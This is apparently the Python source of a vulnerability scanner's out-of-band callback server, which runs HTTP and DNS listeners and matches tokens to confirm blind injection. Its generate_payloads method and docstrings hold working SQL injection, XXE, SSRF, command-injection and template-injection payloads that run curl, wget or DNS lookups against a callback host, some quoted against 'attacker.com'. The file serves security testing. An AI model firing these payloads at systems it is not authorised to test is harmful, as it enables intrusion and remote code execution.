"""
Out-of-Band (OOB) Callback Server — Blind injection detection.

This is the feature that turns SecProbe from "can find reflected vulns"
into "can find vulnerabilities that have NO visible response."

How it works:
    1. Server starts HTTP + DNS listeners on a controlled endpoint
    2. Payloads are crafted with unique tokens pointing to the callback
    3. When a blind injection fires, the vulnerable server reaches out
       to OUR callback server
    4. We match the incoming callback to the token → confirmed blind vuln

Detects:
    - Blind SQL injection (DNS/HTTP exfiltration)
    - Blind XXE (external entity loading)
    - Blind SSRF (server-side request to callback)
    - Blind RCE (curl/wget from exploited command)
    - Blind XSS (stored XSS that fires in another user's browser)
    - Blind SSTI (template engine reaching out)

Architecture:
    - CallbackServer: Manages HTTP listener + token registry
    - TokenRegistry: Thread-safe mapping of token → payload context
    - Each scanner generates unique tokens per injection attempt
    - Main thread polls for callbacks between scan phases

This is what Burp Collaborator does, what interact.sh does. No open-source
Python scanner has this built in.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import secrets
import socket
import threading
import time
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional, Callable
from urllib.parse import urlparse, parse_qs

from secprobe.core.logger import get_logger

log = get_logger("oob")


# ─── Data Models ─────────────────────────────────────────────────────────

@dataclass
class OOBToken:
    """A unique token embedded in a payload, waiting for callback."""
    token: str
    scanner: str            # Which scanner generated this
    target_url: str         # What URL the payload was sent to
    parameter: str          # What parameter was injected
    payload_type: str       # "sqli_blind", "xxe_oob", "ssrf_blind", etc.
    payload: str            # The actual payload that was sent
    created_at: float = field(default_factory=time.time)
    ttl: int = 300          # Token valid for 5 minutes


@dataclass
class OOBCallback:
    """A received callback — proof that a blind injection fired."""
    token: str
    callback_type: str      # "http" or "dns"
    source_ip: str
    source_port: int
    timestamp: float
    method: str             # GET, POST, etc.
    path: str
    headers: dict
    body: str = ""
    # Linked context from the token
    scanner: str = ""
    target_url: str = ""
    parameter: str = ""
    payload_type: str = ""
    payload: str = ""


# ─── Token Registry ─────────────────────────────────────────────────────

class TokenRegistry:
    """
    Thread-safe registry of OOB tokens.

    Tokens are generated with a keyed HMAC so they're unforgeable
    and contain no sensitive data.
    """

    def __init__(self):
        self._tokens: dict[str, OOBToken] = {}
        self._callbacks: list[OOBCallback] = []
        self._lock = threading.Lock()
        self._secret = secrets.token_hex(32)
        self._listeners: list[Callable[[OOBCallback], None]] = []

    def generate_token(self, scanner: str, target_url: str, parameter: str,
                       payload_type: str, payload: str, ttl: int = 300) -> str:
        """
        Generate a unique, unforgeable callback token.

        Returns a 16-char hex string that identifies this exact injection attempt.
        """
        raw = secrets.token_hex(8)  # 16 chars
        mac = hmac.new(self._secret.encode(), raw.encode(), hashlib.sha256).hexdigest()[:8]
        token = f"{raw}{mac}"  # 24 chars total

        oob_token = OOBToken(
            token=token,
            scanner=scanner,
            target_url=target_url,
            parameter=parameter,
            payload_type=payload_type,
            payload=payload,
            ttl=ttl,
        )

        with self._lock:
            self._tokens[token] = oob_token

        return token

    def resolve_token(self, token: str) -> Optional[OOBToken]:
        """Look up a token. Returns None if expired or unknown."""
        with self._lock:
            oob_token = self._tokens.get(token)
            if not oob_token:
                return None
            if time.time() - oob_token.created_at > oob_token.ttl:
                del self._tokens[token]
                return None
            return oob_token

    def record_callback(self, callback: OOBCallback):
        """Record an incoming callback and notify listeners."""
        with self._lock:
            self._callbacks.append(callback)
        for listener in self._listeners:
            try:
                listener(callback)
            except Exception as e:
                log.error("Callback listener error: %s", e)

    def on_callback(self, listener: Callable[[OOBCallback], None]):
        """Register a listener for incoming callbacks."""
        self._listeners.append(listener)

    def get_callbacks(self, scanner: str = "",
                      target_url: str = "") -> list[OOBCallback]:
        """Get received callbacks, optionally filtered."""
        with self._lock:
            results = list(self._callbacks)
        if scanner:
            results = [c for c in results if c.scanner == scanner]
        if target_url:
            results = [c for c in results if c.target_url == target_url]
        return results

    def cleanup_expired(self):
        """Remove expired tokens."""
        now = time.time()
        with self._lock:
            expired = [t for t, tok in self._tokens.items()
                       if now - tok.created_at > tok.ttl]
            for t in expired:
                del self._tokens[t]
        if expired:
            log.debug("Cleaned up %d expired tokens", len(expired))

    @property
    def pending_count(self) -> int:
        with self._lock:
            return len(self._tokens)

    @property
    def callback_count(self) -> int:
        with self._lock:
            return len(self._callbacks)


# ─── HTTP Callback Handler ──────────────────────────────────────────────

class _CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler that catches OOB callbacks."""

    registry: TokenRegistry = None  # Set by CallbackServer

    def do_GET(self):
        self._handle_callback("GET")

    def do_POST(self):
        self._handle_callback("POST")

    def do_PUT(self):
        self._handle_callback("PUT")

    def do_HEAD(self):
        self._handle_callback("HEAD")

    def do_OPTIONS(self):
        self._handle_callback("OPTIONS")

    def _handle_callback(self, method: str):
        """Process any incoming HTTP request as a potential callback."""
        path = self.path
        headers = dict(self.headers)
        body = ""

        # Read body for POST/PUT
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 0:
            body = self.rfile.read(min(content_length, 65536)).decode("utf-8", errors="replace")

        # Extract token from path or query
        token = self._extract_token(path)

        if token and self.registry:
            oob_token = self.registry.resolve_token(token)
            if oob_token:
                callback = OOBCallback(
                    token=token,
                    callback_type="http",
                    source_ip=self.client_address[0],
                    source_port=self.client_address[1],
                    timestamp=time.time(),
                    method=method,
                    path=path,
                    headers=headers,
                    body=body,
                    scanner=oob_token.scanner,
                    target_url=oob_token.target_url,
                    parameter=oob_token.parameter,
                    payload_type=oob_token.payload_type,
                    payload=oob_token.payload,
                )
                self.registry.record_callback(callback)
                log.warning(
                    "🔥 OOB CALLBACK: %s from %s | scanner=%s target=%s param=%s type=%s",
                    token, self.client_address[0],
                    oob_token.scanner, oob_token.target_url,
                    oob_token.parameter, oob_token.payload_type,
                )

        # Always respond 200 to keep the connection alive
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "2")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def _extract_token(self, path: str) -> Optional[str]:
        """
        Extract the callback token from the URL.

        Supports multiple patterns scanners might use:
            /callback/<token>
            /t/<token>
            /<token>
            /?token=<token>
            /anything?t=<token>
        """
        # /callback/<token> or /t/<token>
        parts = path.split("/")
        for i, part in enumerate(parts):
            if part in ("callback", "t", "oob", "c") and i + 1 < len(parts):
                candidate = parts[i + 1].split("?")[0]
                if len(candidate) == 24:
                    return candidate

        # Direct /<token>
        if len(parts) == 2 and len(parts[1].split("?")[0]) == 24:
            return parts[1].split("?")[0]

        # Query param: ?token=<token> or ?t=<token>
        if "?" in path:
            qs = parse_qs(path.split("?", 1)[1])
            for key in ("token", "t", "id", "cb"):
                if key in qs and len(qs[key][0]) == 24:
                    return qs[key][0]

        # Look for any 24-char hex in the path
        import re
        hex_match = re.search(r'([a-f0-9]{24})', path)
        if hex_match:
            return hex_match.group(1)

        return None

    def log_message(self, format, *args):
        """Suppress default HTTP server logging (we use our own)."""
        pass


# ─── DNS Callback Handler ───────────────────────────────────────────────

class _DNSCallbackServer(threading.Thread):
    """
    Minimal DNS server that catches OOB DNS lookups.

    When a blind XXE or SQLi does:
        SELECT LOAD_FILE(CONCAT('\\\\', token, '.attacker.com\\a'))
    or an XXE does:
        <!ENTITY xxe SYSTEM "http://token.attacker.com/xxe">

    The DNS lookup for "token.attacker.com" hits our DNS server,
    confirming the blind vulnerability.
    """

    def __init__(self, registry: TokenRegistry, port: int = 5354,
                 callback_domain: str = ""):
        super().__init__(daemon=True)
        self.registry = registry
        self.port = port
        self.callback_domain = callback_domain
        self._sock = None
        self._running = False

    def run(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self.port))
            self._sock.settimeout(1.0)
            self._running = True

            log.info("DNS callback server listening on UDP port %d", self.port)

            while self._running:
                try:
                    data, addr = self._sock.recvfrom(4096)
                    self._handle_dns_query(data, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    if self._running:
                        log.error("DNS server error: %s", e)
        except OSError as e:
            log.warning("DNS callback server could not start on port %d: %s", self.port, e)
        finally:
            if self._sock:
                self._sock.close()

    def _handle_dns_query(self, data: bytes, addr: tuple):
        """Parse DNS query and check for OOB tokens in the domain name."""
        try:
            # Minimal DNS parsing — extract queried domain
            domain = self._parse_dns_name(data)
            if not domain:
                return

            log.debug("DNS query from %s: %s", addr[0], domain)

            # Look for token in subdomain
            # Expected: <token>.callback.domain or <token>.<anything>
            parts = domain.split(".")
            for part in parts:
                if len(part) == 24:
                    oob_token = self.registry.resolve_token(part)
                    if oob_token:
                        callback = OOBCallback(
                            token=part,
                            callback_type="dns",
                            source_ip=addr[0],
                            source_port=addr[1],
                            timestamp=time.time(),
                            method="DNS",
                            path=domain,
                            headers={},
                            scanner=oob_token.scanner,
                            target_url=oob_token.target_url,
                            parameter=oob_token.parameter,
                            payload_type=oob_token.payload_type,
                            payload=oob_token.payload,
                        )
                        self.registry.record_callback(callback)
                        log.warning(
                            "🔥 OOB DNS CALLBACK: %s from %s for domain %s | scanner=%s target=%s",
                            part, addr[0], domain,
                            oob_token.scanner, oob_token.target_url,
                        )

            # Send a minimal DNS response (A record → 127.0.0.1)
            # to prevent retransmissions
            self._send_dns_response(data, addr)

        except Exception as e:
            log.debug("DNS parse error: %s", e)

    def _parse_dns_name(self, data: bytes) -> Optional[str]:
        """Extract the queried domain name from a raw DNS packet."""
        try:
            # Skip header (12 bytes)
            pos = 12
            labels = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                labels.append(data[pos:pos + length].decode("ascii", errors="replace"))
                pos += length
            return ".".join(labels) if labels else None
        except Exception:
            return None

    def _send_dns_response(self, query: bytes, addr: tuple):
        """Send a minimal DNS response to acknowledge the query."""
        try:
            # Build response: same ID, QR=1, RCODE=0, 1 answer
            if len(query) < 12:
                return

            transaction_id = query[:2]
            flags = b'\x81\x80'  # Standard response, no error
            counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'  # 1 question, 1 answer

            # Copy the question section
            question_end = 12
            while question_end < len(query) and query[question_end] != 0:
                question_end += query[question_end] + 1
            question_end += 5  # null byte + QTYPE (2) + QCLASS (2)

            question = query[12:question_end]

            # Answer: pointer to name + A record + TTL + 127.0.0.1
            answer = b'\xc0\x0c'           # Pointer to name in question
            answer += b'\x00\x01'           # Type A
            answer += b'\x00\x01'           # Class IN
            answer += b'\x00\x00\x00\x3c'  # TTL 60
            answer += b'\x00\x04'           # Data length 4
            answer += b'\x7f\x00\x00\x01'  # 127.0.0.1

            response = transaction_id + flags + counts + question + answer
            self._sock.sendto(response, addr)
        except Exception:
            pass

    def stop(self):
        self._running = False


# ─── Main Callback Server ───────────────────────────────────────────────

class CallbackServer:
    """
    Out-of-Band callback server for blind vulnerability detection.

    Runs HTTP + DNS listeners in background threads, manages token
    lifecycle, and provides methods for scanners to generate payloads
    with embedded callback URLs.

    Usage:
        server = CallbackServer(http_port=8888)
        server.start()

        # In a scanner:
        token = server.generate_token(
            scanner="sqli",
            target_url="https://target.com/login",
            parameter="username",
            payload_type="sqli_blind",
            payload="' OR 1=1--",
        )
        callback_url = server.get_callback_url(token)
        # callback_url = "http://YOUR_IP:8888/callback/abc123..."

        # Use callback_url in payloads:
        # ' UNION SELECT LOAD_FILE('http://YOUR_IP:8888/callback/abc123...')--

        # After scanning, check for hits:
        callbacks = server.get_callbacks()
        for cb in callbacks:
            print(f"BLIND {cb.payload_type} confirmed: {cb.target_url} param={cb.parameter}")

        server.stop()
    """

    def __init__(self, http_port: int = 8888, dns_port: int = 5354,
                 callback_host: str = "", enable_dns: bool = True):
        self.http_port = http_port
        self.dns_port = dns_port
        self.enable_dns = enable_dns

        # Auto-detect external IP if not provided
        if callback_host:
            self.callback_host = callback_host
        else:
            self.callback_host = self._detect_ip()

        self.registry = TokenRegistry()

        self._http_server = None
        self._http_thread = None
        self._dns_server = None
        self._running = False

    def start(self):
        """Start HTTP and DNS callback listeners."""
        if self._running:
            return

        # Start HTTP listener
        _CallbackHandler.registry = self.registry
        self._http_server = HTTPServer(("0.0.0.0", self.http_port), _CallbackHandler)
        self._http_thread = threading.Thread(target=self._http_server.serve_forever,
                                             daemon=True)
        self._http_thread.start()
        log.info("OOB HTTP callback server on port %d", self.http_port)

        # Start DNS listener
        if self.enable_dns:
            self._dns_server = _DNSCallbackServer(
                self.registry, self.dns_port, self.callback_host,
            )
            self._dns_server.start()

        self._running = True
        log.info("OOB callback server ready — callback URL: http://%s:%d/callback/<token>",
                 self.callback_host, self.http_port)

    def stop(self):
        """Stop all listeners."""
        if self._http_server:
            self._http_server.shutdown()
        if self._dns_server:
            self._dns_server.stop()
        self._running = False
        log.info("OOB callback server stopped (%d callbacks received)",
                 self.registry.callback_count)

    def generate_token(self, scanner: str, target_url: str, parameter: str,
                       payload_type: str, payload: str, ttl: int = 300) -> str:
        """Generate a unique callback token for a specific injection attempt."""
        return self.registry.generate_token(
            scanner=scanner,
            target_url=target_url,
            parameter=parameter,
            payload_type=payload_type,
            payload=payload,
            ttl=ttl,
        )

    def get_callback_url(self, token: str, path: str = "callback") -> str:
        """Get the full HTTP callback URL for a token."""
        return f"http://{self.callback_host}:{self.http_port}/{path}/{token}"

    def get_callback_domain(self, token: str) -> str:
        """
        Get a DNS callback domain for a token.

        Use this for DNS-based exfiltration payloads like:
            SELECT LOAD_FILE(CONCAT('\\\\', <token_domain>, '\\a'))
        """
        return f"{token}.{self.callback_host}"

    def get_callbacks(self, scanner: str = "",
                      target_url: str = "") -> list[OOBCallback]:
        """Get received callbacks, optionally filtered."""
        return self.registry.get_callbacks(scanner=scanner, target_url=target_url)

    def wait_for_callbacks(self, timeout: int = 30, min_callbacks: int = 0) -> list[OOBCallback]:
        """
        Wait for callbacks to arrive, then return them.

        Used between scan phases — inject payloads, wait, check for hits.
        """
        start = time.time()
        initial = self.registry.callback_count

        log.info("Waiting up to %ds for OOB callbacks (%d tokens pending)...",
                 timeout, self.registry.pending_count)

        while time.time() - start < timeout:
            current = self.registry.callback_count
            if current > initial and current - initial >= min_callbacks:
                break
            time.sleep(0.5)

        new_callbacks = self.registry.callback_count - initial
        if new_callbacks > 0:
            log.warning("🔥 Received %d new OOB callbacks!", new_callbacks)
        else:
            log.info("No new OOB callbacks received in %ds", timeout)

        return self.registry.get_callbacks()

    def generate_payloads(self, scanner: str, target_url: str,
                          parameter: str) -> dict[str, str]:
        """
        Generate ready-to-use blind injection payloads with embedded callbacks.

        Returns dict of {payload_type: payload_string} for common blind attacks.
        """
        payloads = {}
        base = self.callback_host
        port = self.http_port

        # ── Blind SQL Injection ──────────────────────────────────
        token = self.generate_token(scanner, target_url, parameter, "sqli_dns_exfil", "")
        url = self.get_callback_url(token)
        domain = self.get_callback_domain(token)

        payloads["sqli_mysql_load"] = f"' UNION SELECT LOAD_FILE('{url}')-- -"
        payloads["sqli_mssql_xp"] = f"'; EXEC master..xp_dirtree '//{domain}/a'-- -"
        payloads["sqli_postgres_copy"] = f"'; COPY (SELECT '') TO PROGRAM 'curl {url}'-- -"
        payloads["sqli_oracle_utl"] = f"' UNION SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL-- -"

        # ── Blind XXE ────────────────────────────────────────────
        token = self.generate_token(scanner, target_url, parameter, "xxe_oob", "")
        url = self.get_callback_url(token)

        payloads["xxe_external_entity"] = (
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>'
            f'<foo>&xxe;</foo>'
        )
        payloads["xxe_parameter_entity"] = (
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}">'
            f'%xxe;]><foo>test</foo>'
        )

        # ── Blind SSRF ──────────────────────────────────────────
        token = self.generate_token(scanner, target_url, parameter, "ssrf_blind", "")
        url = self.get_callback_url(token)

        payloads["ssrf_http"] = url
        payloads["ssrf_with_redirect"] = f"http://0x7f000001:{port}/callback/{token}"

        # ── Blind RCE ────────────────────────────────────────────
        token = self.generate_token(scanner, target_url, parameter, "rce_blind", "")
        url = self.get_callback_url(token)

        payloads["rce_curl"] = f"; curl {url}"
        payloads["rce_wget"] = f"; wget -q {url}"
        payloads["rce_nslookup"] = f"; nslookup {domain}"
        payloads["rce_powershell"] = f"; powershell -c \"Invoke-WebRequest -Uri {url}\""

        # ── Blind SSTI ───────────────────────────────────────────
        token = self.generate_token(scanner, target_url, parameter, "ssti_blind", "")
        url = self.get_callback_url(token)

        payloads["ssti_jinja2"] = "{{request.application.__globals__.__builtins__.__import__('os').popen('curl " + url + "').read()}}"
        payloads["ssti_twig"] = "{{['curl " + url + "']|filter('system')}}"
        payloads["ssti_freemarker"] = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl ' + url + '")}'

        return payloads

    def _detect_ip(self) -> str:
        """Auto-detect the machine's external IP address."""
        try:
            # Connect to a public DNS to find our outbound IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    @property
    def is_running(self) -> bool:
        return self._running

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()
